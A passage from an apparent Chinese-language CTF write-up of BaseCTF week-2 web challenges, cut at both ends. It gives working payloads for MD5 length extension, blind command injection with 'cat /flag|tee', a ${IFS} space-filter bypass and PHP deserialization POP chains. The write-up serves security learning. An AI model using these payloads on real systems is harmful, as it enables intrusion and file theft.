class="meta">%093</span><span class="meta">%B3</span><span class="meta">%8B</span><span class="meta">%BE</span><span class="meta">%C3</span><span class="meta">%99</span><span class="meta">%E5Y</span><span class="meta">%C7h</span><span class="meta">%12QC</span><span class="meta">%9C</span><span class="built_in">&amp;name</span>=<span class="meta">%80</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%03</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00admin</span>&amp;md5=e3de88ef6ff21cec04dac8f6b8158797</span><br></pre></td></tr></table></figure><p><img src="/2024/09/11/BaseCTF-week2/image-20240903134813566-17260236445964.png" alt="image-20240903134813566"></p><p>特别注意：</p><p>不同的md5拓展攻击使用的工具不一样，大概有两种不同的拓展情况</p><p>一种是拓展字符串中没有明文内容，也就像题目中的情况，需要拓展的字符串name不含明文内容，即可使用本文给出工具，进行不包含明文的哈希长度拓展攻击；</p><p>另外一种是拓展字符串中存在明文内容，举例参考文章中出现例题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$secretKey</span> = <span class="string">&#x27;xxxxxx&#x27;</span>; <span class="comment">#xxx为未知内容，但长度已知为6。</span></span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"><span class="variable">$sign</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sign&#x27;</span>];</span><br><span class="line"><span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$secretKey</span>.<span class="variable">$v1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v1</span> === <span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$token</span>); <span class="comment">//token=2df51a84abc64a28740d6d2ae8cd7b16</span></span><br><span class="line">                 <span class="comment">//输出$token需要使$token=$secretKey.&#x27;test&#x27;，所以&#x27;test&#x27;在本题中也算明文，故v1需要带上&#x27;test&#x27;来一起进行长度拓展</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$token</span> === <span class="variable">$sign</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此处的v1虽为拓展字符串，但是包含部分明文内容”test”，这时使用的工具为hashpump，具体使用教程在此教程中：</p><p><a href="https://www.cnblogs.com/yunen/p/13624595.html">https://www.cnblogs.com/yunen/p/13624595.html</a></p><h3 id="一起吃豆豆"><a href="#一起吃豆豆" class="headerlink" title="一起吃豆豆"></a>一起吃豆豆</h3><p>关闭浏览器的javascirpt，就可以查看该项目的原码</p><p>js游戏题目一般有两种常见思路，一种是修改数值，另一种是源码审计，这一题就是源码审计的思路，在index.js文件中搜索找到一串可疑的字符串</p><p><img src="/2024/09/11/BaseCTF-week2/image-20240903153435878-17260236445963.png" alt="image-20240903153435878"></p><p>直接将其复制到控制台即可<del>base64解码也可</del></p><p><img src="/2024/09/11/BaseCTF-week2/image-20240903153611534-17260236445951.png" alt="image-20240903153611534"></p><h3 id="你听不到我的声音"><a href="#你听不到我的声音" class="headerlink" title="你听不到我的声音"></a>你听不到我的声音</h3><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>分析shell_exec可以执行命令，但不会回显，所以需要使用外带或者tee命令读取命令执行结果，并且将结果重定向到指定文件中</p><p>payload post提交</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="built_in">cat</span> /flag|<span class="built_in">tee</span> 1.txt</span><br></pre></td></tr></table></figure><p>之后访问当前目录下的1.txt即可</p><p><img src="/2024/09/11/BaseCTF-week2/image-20240903162922628-17260236445965.png" alt="image-20240903162922628"></p><h3 id="RCEisamazingwithspace"><a href="#RCEisamazingwithspace" class="headerlink" title="RCEisamazingwithspace"></a>RCEisamazingwithspace</h3><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="comment">// check if space is present in the command</span></span><br><span class="line"><span class="comment">// use of preg_match to check if space is present in the command</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\s/&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Space not allowed in command&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// execute the command</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>命令执行，过滤空格可用${IFS}绕过</p><p>payload（post）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="built_in">cat</span><span class="variable">$&#123;IFS&#125;</span>/flag</span><br></pre></td></tr></table></figure><p><img src="/2024/09/11/BaseCTF-week2/image-20240903164726532-17260236445966.png" alt="image-20240903164726532"></p><h3 id="ez-ser"><a href="#ez-ser" class="headerlink" title="ez_ser"></a>ez_ser</h3><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">re</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;chu0))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;I can not believes!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0-&gt;<span class="variable">$nononono</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kw</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dt</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;lalalla&quot;</span>.<span class="variable language_">$this</span>-&gt;kw;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ALL Done!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dusk</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$over</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;dusk != <span class="string">&quot;gods&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;什么，你竟敢不认可?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;over-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nothing</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;happy happy happy!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are over!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ser</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>poc链</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">web</span>-&gt;</span><span class="function"><span class="title">re</span>-&gt;</span><span class="function"><span class="title">pwn</span>-&gt;</span>misc</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">re</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;chu0))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;I can not believes!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0-&gt;<span class="variable">$nononono</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kw</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dt</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;lalalla&quot;</span>.<span class="variable language_">$this</span>-&gt;kw;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ALL Done!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dusk</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$over</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;dusk != <span class="string">&quot;gods&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;什么，你竟敢不认可?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;over-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nothing</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">web</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;kw = <span class="keyword">new</span> <span class="title function_ invoke__">re</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;kw-&gt;chu0 = <span class="keyword">new</span> <span class="title function_ invoke__">pwn</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;kw-&gt;chu0-&gt;over = <span class="keyword">new</span> <span class="title class_">Misc</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:3:&quot;web&quot;:2:&#123;s:2:&quot;kw&quot;;O:2:&quot;re&quot;:1:&#123;s:4:&quot;chu0&quot;;O:3:&quot;pwn&quot;:2:&#123;s:4:&quot;dusk&quot;;N;s:4:&quot;over&quot;;O:4:&quot;Misc&quot;:2:&#123;s:7:&quot;nothing&quot;;N;s:4:&quot;flag&quot;;N;&#125;&#125;&#125;s:2:&quot;dt&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Really-EZ-POP"><a href="#Really-EZ-POP" class="headerlink" title="Really EZ POP"></a>Really EZ POP</h3><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&#x27;echo 123;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$word</span> = <span class="string">&#x27;Hello, World!&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Shark says:&#x27;</span> . <span class="variable language_">$this</span>-&gt;word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$animal</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$sea_ani</span> = <span class="variable language_">$this</span>-&gt;animal;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="variable">$sea_ani</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nature</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sea</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sea-&gt;see;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$nature</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc链</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">N<span class="function"><span class="title">ature</span>-&gt;</span>S<span class="function"><span class="title">ea</span>-&gt;</span>S<span class="function"><span class="title">hark</span>-&gt;</span>Sink</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$word</span> ;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;word = <span class="string">&quot;sdts&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;word = <span class="keyword">new</span> <span class="title class_">Sink</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$animal</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;animal = <span class="keyword">new</span> <span class="title class_">Shark</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nature</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sea</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sea = <span class="keyword">new</span> <span class="title class_">Sea</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$nature</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Nature</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意：在php低版本中private类对象中的参数不可以直接赋值，我们可以通过在类内添加魔术方法__construct()来对私有对象中的变量赋值</p><p>补充：由于php序列化时private和protected类参数会引入不可见字符%00，其中private变量表示为%00类名%00属性名，而protected变量表示为%00*%00属性名，所以我们需要用urlencode对payload进行编码，不然可能会导致服务器识别不了private和protected变量，参考文章：<a href="https://www.freebuf.com/articles/web/347246.html">https://www.freebuf.com/articles/web/347246.html</a></p><h3 id="数学大师"><a href="#数学大师" class="headerlink" title="数学大师"></a>数学大师</h3><p>题目提示需要开启session cookie</p><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启会话</span></span><br><span class="line">req = requests.session() </span><br><span class="line">url = <span class="string">&quot;http://challenge.basectf.fun:34378&quot;</span></span><br><span class="line"></span><br><span class="line">answer = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span 